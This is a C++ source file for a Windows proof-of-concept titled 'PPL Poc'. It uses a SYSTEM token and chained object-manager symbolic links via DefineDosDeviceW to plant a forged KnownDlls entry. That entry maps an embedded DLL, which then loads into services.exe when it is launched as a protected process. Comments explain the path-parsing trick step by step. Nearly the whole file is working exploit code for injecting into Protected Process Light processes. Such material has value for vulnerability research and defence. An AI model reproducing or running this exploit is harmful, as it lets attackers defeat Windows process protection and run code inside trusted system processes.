#include "stdafx.h"

_NT_BEGIN

#include "wlog.h"
#include "token.h"

extern "C" extern UCHAR codesec_dll_begin[], codesec_dll_end[];

HRESULT GetLastHrEx(ULONG dwError = GetLastError())
{
	NTSTATUS status = RtlGetLastNtStatus();
	return dwError == RtlNtStatusToDosErrorNoTeb(status) ? HRESULT_FROM_NT(status) : HRESULT_FROM_WIN32(dwError);
}

BEGIN_PRIVILEGES(tp_all, 7)
	LAA(SE_ASSIGNPRIMARYTOKEN_PRIVILEGE),
	LAA(SE_INCREASE_QUOTA_PRIVILEGE),
	LAA(SE_TCB_PRIVILEGE),
	LAA(SE_DEBUG_PRIVILEGE),
	LAA(SE_CREATE_PERMANENT_PRIVILEGE),
	LAA(SE_BACKUP_PRIVILEGE),
	LAA(SE_RESTORE_PRIVILEGE),
END_PRIVILEGES

NTSTATUS CreateLink(_Out_ PHANDLE SymbolicLinkHandle, _In_ PCWSTR Name, _In_ PCWSTR TargetName)
{
	UNICODE_STRING ObjectName, Target;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
	RtlInitUnicodeString(&ObjectName, Name);
	RtlInitUnicodeString(&Target, TargetName);
	return ZwCreateSymbolicLinkObject(SymbolicLinkHandle, SYMBOLIC_LINK_SET, &oa, &Target);
}

#define MY_SECTION_NAME L"\\BaseNamedObjects\\{B821E872-E64D-4410-B64E-A5A75AC7F340}"

NTSTATUS CreateSection(_Out_ PHANDLE SectionHandle)
{
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
	RtlInitUnicodeString(&ObjectName, L"\\systemroot\\temp\\PPL.dll");

	HANDLE hFile;
	IO_STATUS_BLOCK iosb;
	LARGE_INTEGER AllocationSize = { RtlPointerToOffset(codesec_dll_begin, codesec_dll_end) };

	NTSTATUS status = NtCreateFile(&hFile, FILE_ALL_ACCESS, &oa, &iosb, &AllocationSize,
		0, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE, 0, 0);

	if (0 <= status)
	{
		if (0 <= (status = NtWriteFile(hFile, 0, 0, 0, &iosb, codesec_dll_begin, AllocationSize.LowPart, 0, 0)))
		{
			RtlInitUnicodeString(&ObjectName, MY_SECTION_NAME);

			status = NtCreateSection(SectionHandle, SECTION_MAP_EXECUTE|SECTION_MAP_READ, &oa, 0, PAGE_EXECUTE, SEC_IMAGE, hFile);
		}

		NtClose(hFile);
	}

	return status;
}

HRESULT StartProtectedProcess(HANDLE hPrimaryToken)
{
	WCHAR path[MAX_PATH], CmdLine[16];

	if (SearchPathW(0, L"services.exe", 0, _countof(path), path, 0))
	{
		if (SetTokenInformation(hPrimaryToken, ::TokenSessionId, &((_PEB*)RtlGetCurrentPeb())->SessionId, sizeof(ULONG)))
		{
			PROCESS_INFORMATION pi;
			STARTUPINFO si = { sizeof si };
			swprintf_s(CmdLine, _countof(CmdLine), L"\n%x", GetCurrentThreadId());

			if (CreateProcessAsUserW(hPrimaryToken, path, CmdLine, 0, 0, 0, CREATE_PROTECTED_PROCESS, 0, 0, &si, &pi))
			{
				NtClose(pi.hThread);

				NTSTATUS status = ZwWaitForSingleObject(pi.hProcess, TRUE, 0);

				NtClose(pi.hProcess);

				switch (status)
				{
				case STATUS_ALERTED:
					return STATUS_SUCCESS;
				case STATUS_SUCCESS:
					return HRESULT_FROM_NT(STATUS_UNSUCCESSFUL);
				}

				return HRESULT_FROM_NT(status);
			}
		}
	}

	return HRESULT_FROM_WIN32(GetLastError());
}

NTSTATUS DeleteSectionLink()
{
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
	RtlInitUnicodeString(&ObjectName, L"GLOBALROOT\\KnownDlls\\EventAggregation.dll" + _countof("GLOBALROOT") - 1);

	HANDLE SymbolicLinkHandle;
	
	NTSTATUS status = ZwOpenSymbolicLinkObject(&SymbolicLinkHandle, WRITE_DAC, &oa);
	
	if (0 <= status)
	{
		static const SECURITY_DESCRIPTOR sd { SECURITY_DESCRIPTOR_REVISION, 0, SE_DACL_PRESENT|SE_DACL_PROTECTED };
		
		status = ZwSetSecurityObject(SymbolicLinkHandle, DACL_SECURITY_INFORMATION, const_cast<SECURITY_DESCRIPTOR*>(&sd));
		
		NtClose(SymbolicLinkHandle);

		if (0 <= status)
		{
			if (0 <= (status = ZwOpenSymbolicLinkObject(&SymbolicLinkHandle, DELETE, &oa)))
			{
				status = ZwMakeTemporaryObject(SymbolicLinkHandle);
				NtClose(SymbolicLinkHandle);
			}
		}
	}
		
	return status;
}

HRESULT Poc(WLog& log)
{
	HANDLE hSymLink0, hSymLink1, hSymLink2;
	
	ULONG FACILITY = FACILITY_NT_BIT;

	// always:
	// \?? in user context:						-> \Sessions\0\DosDevices\LUID
	// \?? in system context:					-> \GLOBAL??
	// \GLOBAL??\GLOBALROOT						-> 
	// ---------------------------------------------------------------------
	// create 3 links:
	// \??\GLOBALROOT							=> \??
	// \??\KnownDlls							=> \GLOBAL??
	// \GLOBAL??\X.dll							=> \BaseNamedObjects\MySection
	// ---------------------------------------------------------------------
	// DefineDosDeviceW(GLOBALROOT\KnownDlls\X.dll, \BaseNamedObjects\MySection)
	// ---------------------------------------------------------------------
	// ZwOpenSymbolicLinkObject(\??\GLOBALROOT\KnownDlls\X.dll)
	// parsed to in user context:
	// [\??] \GLOBALROOT\KnownDlls\X.dll
	// [\Sessions\0\DosDevices\LUID\GLOBALROOT] \KnownDlls\X.dll
	// [\Sessions\0\DosDevices\LUID\KnownDlls] \X.dll
	// \GLOBAL??\X.dll
	//----------------------------------------------------------------------
	// ZwCreateSymbolicLinkObject(\??\GLOBALROOT\KnownDlls\X.dll, \BaseNamedObjects\MySection)
	// parsed to in system context:
	// [\??] \GLOBALROOT\KnownDlls\X.dll
	// [\GLOBAL??\GLOBALROOT] \KnownDlls\X.dll
	// \KnownDlls\X.dll
	//----------------------------------------------------------------------
	// \KnownDlls\X.dll							=> \BaseNamedObjects\MySection

	TOKENS tokens(&tp_all);

	NTSTATUS status = tokens.Get(L"\\GLOBAL??");

	log(L"Get System Token = %x\r\n", status)[status];

	if (0 <= status && 0 <= (status = SetToken(tokens.hImpersonationToken)))
	{
		status = CreateLink(&hSymLink0, L"\\GLOBAL??\\EventAggregation.dll", MY_SECTION_NAME);

		log(L"Create Link in \\GLOBAL?? = %x\r\n", status)[status];

		SetToken();

		if (0 <= status)
		{
			if (0 <= (status = CreateLink(&hSymLink1, L"\\??\\KnownDlls", L"\\GLOBAL??")))
			{
				if (0 <= (status = CreateLink(&hSymLink2, L"\\??\\GLOBALROOT", L"\\??")))
				{
					if (DefineDosDeviceW(DDD_RAW_TARGET_PATH|DDD_NO_BROADCAST_SYSTEM, 
						L"GLOBALROOT\\KnownDlls\\EventAggregation.dll", MY_SECTION_NAME))
					{
						log << L"DefineDosDeviceW OK !!\r\n";

						HANDLE hSection;

						status = CreateSection(&hSection);

						log(L"CreateSection = %x\r\n", status)[status];

						if (0 <= status)
						{
							if (0 <= (status = SetToken(tokens.hImpersonationToken)))
							{
								FACILITY = 0;
								status = StartProtectedProcess(tokens.hPrimaryToken);

								log(L"StartProtectedProcess = %x\r\n", status)[status];

								status = DeleteSectionLink();

								log(L"DeleteSectionLink = %x\r\n", status)[status];

								SetToken();
							}

							NtClose(hSection);
						}
					}
					else
					{
						FACILITY = 0;
						status = GetLastHrEx();

						log(L"DefineDosDeviceW = %x\r\n", status)[status];
					}

					NtClose(hSymLink2);
				}

				NtClose(hSymLink1);
			}

			NtClose(hSymLink0);
		}
	}

	return status | FACILITY;
}

void WINAPI ep(void*)
{
	WLog log;
	if (!log.Init(0x1000))
	{
		if (HWND hwnd = CreateWindowExW(0, WC_EDIT, L"PPL Poc", WS_OVERLAPPEDWINDOW|WS_HSCROLL|WS_VSCROLL|ES_MULTILINE,
			CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, HWND_DESKTOP, 0, 0, 0))
		{
			HFONT hFont = 0;
			NONCLIENTMETRICS ncm = { sizeof(ncm) };
			if (SystemParametersInfo(SPI_GETNONCLIENTMETRICS, sizeof(ncm), &ncm, 0))
			{
				wcscpy(ncm.lfMessageFont.lfFaceName, L"Courier New");
				ncm.lfMessageFont.lfHeight = -ncm.iMenuHeight;
				if (hFont = CreateFontIndirectW(&ncm.lfMessageFont))
				{
					SendMessage(hwnd, WM_SETFONT, (WPARAM)hFont, 0);
				}
			}

			ULONG n = 8;
			SendMessage(hwnd, EM_SETTABSTOPS, 1, (LPARAM)&n);

			Poc(log);

			log >> hwnd;

			ShowWindow(hwnd, SW_SHOWNORMAL);

			MSG msg;

			while (0 < GetMessage(&msg, 0, 0, 0))
			{
				TranslateMessage(&msg);
				DispatchMessageW(&msg);
				if (!IsWindow(hwnd))
				{
					break;
				}
			}

			if (hFont)
			{
				DeleteObject(hFont);
			}
		}
	}

	ExitProcess(0);
}

_NT_END